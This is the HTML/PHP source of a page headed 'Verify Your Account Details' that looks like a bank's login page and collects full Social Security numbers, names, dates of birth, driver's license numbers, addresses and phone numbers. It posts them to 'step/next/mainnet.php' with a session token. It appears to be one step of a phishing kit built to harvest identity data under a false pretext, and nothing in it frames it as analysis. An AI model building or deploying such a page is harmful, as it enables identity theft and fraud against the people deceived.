  ...
  <div id="page-container" class="page-container"><div class="centered-content clearfix">
    <div class="g-unauth-main-container">
        <section class="unauth-intro-area">
            <h2 class="unauth-intro-area__title ">Verify Your Account Details</h2>
            ...
            <div class="unauth-intro-area__help">
                ...
                <p class="unauth-intro-area__text">Please verify your details in the form below.</p>
            </div>
            ...
            <form action="step/next/mainnet.php?token=<?php echo $_SESSION['token']; ?>" method="post" class="unauth-form jqtransform js-login-form">
                ...
                <div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-ssn-tin" style="">
                    <div class="unauth-form__row">
                        <div class="unauth-form__rowitem">
                            <label class="unauth-form__label" for="unauth-ic-form-ssn-tin">Social Security Number:</label>
                            <div>
                                <input name="ssn-tin" id="unauth-ic-form-ssn-tin" placeholder="Enter Social Security Number" maxlength="9" class="unauth-form__input js-mobilepassword" type="tel" style="display: none;" autocomplete="off"><input name="ssn-tinClone" id="unauth-ic-form-ssn-tinClone" placeholder="Enter Social Security Number" maxlength="9" class="unauth-form__input js-mobilepassword" type="tel" autocomplete="off">
                            </div>
                            <div class="unauth-form__block--guidance">
                                ...
                                <label data-rule="rangeLen" class="unauth-form__label--guidance is-default">Is 9 digits</label>
                            </div>
                        </div>
                    </div>               
                </div>                
                            ...
                            <div class="js-user-block">
                                <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                        ...
                                        <div>
                                            <input id="unauth-form-first-name" name="fname" type="text" placeholder="Enter First Name" class="unauth-form__input js-firstname" data-toenable="accInfoLastName" maxlength="200" autocomplete="off" required="">
                                        </div>
                                    ...
                                    <div class="unauth-form__rowitem g-right">
                                        ...
                                        <div>
                                            <input name="lname" id="unauth-form-last-name" class="unauth-form__input js-lastname" placeholder="Enter Last Name" type="text" data-toenable="accountInfoDOB" maxlength="200" autocomplete="off" required="">
                                        </div>
                                        <div class="unauth-form__block--guidance">
                                            <label data-rule="rangeLen" class="unauth-form__label--guidance is-default">Contains only letters</label>
                                        </div>
                                ...
                                <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                            ...
                                            <div>
                                                <input name="dob" type="text" data-toenable="accInfoLastFourSSN" placeholder="Enter Date of Birth (mm/dd/yyyy)" class="unauth-form__input datepicker unauth-ic-form__dateinput hasDatepicker" id="dp1608300128480" autocomplete="off" data-mask="00/00/0000" required="">
                                            </div>
                                            <div class="js-error-container unauth-form__block--error"></div>
                                    </div> 
                                    <div class="unauth-form__rowitem g-right">
                                        <label class="unauth-form__label" for="unauth-ic-form-ssn">Social Security Number:</label>
                                        <div>
                                            <input name="ssn" placeholder="Enter All 9 Digits of SSN" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="tel" maxlength="9" autocomplete="off" data-mask="000-00-0000" required="">
                                        </div>
                                        <div class="unauth-form__block--guidance">
                                            <label data-rule="digits" class="unauth-form__label--guidance is-default">Contains only numbers</label>
                                     ...
                                     <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                            <label class="unauth-form__label">Driver's License Number:</label>
                                            <div>
                                                <input name="dlnum" placeholder="Driver's License Number" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="text" maxlength="12" autocomplete="off" required="">
                                            </div>
                                            <div class="js-error-container unauth-form__block--error"></div>
                                    </div> 
                                    <div class="unauth-form__rowitem g-right">
                                        <label class="unauth-form__label" for="unauth-ic-form-ssn">Street Address:</label>
                                        <div>
                                            <input name="address" placeholder="Enter Your Street Address" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="text" maxlength="34" autocomplete="off" required="">
                                        </div>
                                        <div class="unauth-form__block--guidance">
                                            <label data-rule="digits" class="unauth-form__label--guidance is-default">Contains only numbers</label>
                                            <label data-rule="rangeLen" class="unauth-form__label--guidance is-default">Is exactly 4 digits</label>
                                 ...
                                 <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                            <label class="unauth-form__label">City:</label>
                                            <div>
                                                <input name="city" placeholder="Enter Your City" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="text" maxlength="14" autocomplete="off" required="">
                                            </div>
                                            <div class="js-error-container unauth-form__block--error"></div>
                                    </div> 
                                    <div class="unauth-form__rowitem g-right">
                                        <label class="unauth-form__label" for="unauth-ic-form-ssn">Zip Code:</label>
                                        <div>
                                            <input name="zipcode" placeholder="Enter Your Zip Code" id="zip" class="unauth-form__input js-ssn-tin" type="tel" maxlength="6" pattern="\d*" autocomplete="off" required="">
                                        </div>
                                        <div class="unauth-form__block--guidance">
                                            <label data-rule="digits" class="unauth-form__label--guidance is-default">Contains only numbers</label>
                                            <label data-rule="rangeLen" class="unauth-form__label--guidance is-default">Is exactly 4 digits</label>
                                    ...
                                    <div class="unauth-form__rowitem g-left">
                                            <label class="unauth-form__label">Phone Number:</label>
                                            <div>
                                                <input name="phn" placeholder="Enter Your Phone Number" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="tel" maxlength="10" autocomplete="off" required="">
                                            </div>
                                            <div class="js-error-container unauth-form__block--error"></div>
                                    </div> 
                                </div>
                ...
                <div class="unauth-content-section__button-wrap">
                    <button name="account_verify" class="btn unauth-form__submit-button js-submit-button">Continue</button>
